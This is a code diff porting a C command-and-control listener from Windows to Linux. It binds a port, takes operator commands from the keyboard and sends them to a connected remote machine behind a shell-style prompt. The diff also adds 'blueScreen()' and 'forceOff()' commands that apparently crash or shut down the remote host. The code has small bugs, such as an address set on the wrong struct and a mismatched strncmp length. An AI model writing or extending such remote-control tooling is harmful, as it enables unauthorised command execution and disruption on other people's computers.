@@ -1,23 +1,13 @@
-#ifndef WIN32
-#define WIN32
-#endif
-
-#ifndef _WINDOWS_
-#define WIN32_LEAN_AND_MEAN
-#include <Windows.h>
-#undef WIN32_LEAN_AND_MEAN
-#endif // !_WINDOWS_
-
-#include <WinSock2.h>
-
-#pragma comment(lib, "ws2_32.lib")
 #include <stdio.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
 #include <stdlib.h>
-#include <WS2tcpip.h>
-#include <string>
-#include <io.h>
+#include <string.h>
+#include <unistd.h>
+#include <arpa/inet.h>
 
-INT main() {
+int main() {
 	int iSock, iSock_Client;
 	char buffer[1024];
 	char cResp[18384];
@@ -26,20 +16,20 @@ INT main() {
 	int value = 1;
 	socklen_t cLen;
 
-	iSock = socket(AF_INET, SOCK_STREAM, NULL);
+	iSock = socket(AF_INET, SOCK_STREAM, 0);
 
-	if (setsockopt(iSock, SOL_SOCKET, SO_REUSEADDR, (char*)value, sizeof(value)) < 0) {
+	if (setsockopt(iSock, SOL_SOCKET, SO_REUSEADDR, &value, sizeof(value)) < 0) {
 		printf("%s\n", "cannot set socket settings");
-		return TRUE;
+		return 0x01;
 	}
 
 	sAddress.sin_family = AF_INET;
-	cAddress.sin_addr.s_addr = inet_addr("127.0.0.1");
-	sAddress.sin_port = htons(50004);
+	cAddress.sin_addr.s_addr = inet_addr("192.168.1.226");
+	sAddress.sin_port = htons(50005);
 
 	if (bind(iSock, (struct sockaddr*)&sAddress, sizeof(sAddress)) != 0) {
 		printf("%s\n", "failed to produce port bind");
-		return TRUE;
+		return 0x01;
 	}
 	listen(iSock, 5);
 	cLen = sizeof(cAddress);
@@ -47,14 +37,20 @@ INT main() {
 
 	while (1) {
 	jmp:
-		RtlZeroMemory(buffer, sizeof(buffer));
-		RtlZeroMemory(cResp, sizeof(cResp));
+		bzero(&buffer, sizeof(buffer));
+		bzero(&cResp, sizeof(cResp));
 		printf("%s~$: ", inet_ntoa(cAddress.sin_addr));
 
 		fgets(buffer, sizeof(buffer), (stdin));
 		strtok(buffer, "\n");
-		_write(iSock_Client, buffer, sizeof(buffer));
+		write(iSock_Client, buffer, sizeof(buffer));
 		if (strncmp("q", buffer, 1) == 0) {
+			break;
+		}
+		if (strncmp("blueScreen()", buffer, 12) == 0) {
+			break;
+		}
+		if (strncmp("forceOff()", buffer, 12) == 0) {
 			break;
 		}
 		else {
